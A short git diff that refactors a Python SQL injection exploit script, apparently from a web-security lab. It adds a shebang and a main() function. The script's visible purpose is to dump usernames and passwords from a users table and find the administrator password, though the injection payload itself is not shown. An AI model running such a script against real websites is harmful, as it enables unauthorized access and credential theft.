@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 import requests
 import sys
 import urllib3
@@ -21,9 +23,7 @@ def exploit_sqli_users_table(url):
         return True
     return False
 
-
-
-if __name__ == "__main__":
+def main():
     try:
         url = sys.argv[1].strip()
     except IndexError:
@@ -34,4 +34,7 @@ if __name__ == "__main__":
     print("[+] Dumping the list of usernames and passwords...")
     if not exploit_sqli_users_table(url):
         print("[-] Did not find an administrator password.")
-    
+
+
+if __name__ == "__main__":
+   main()
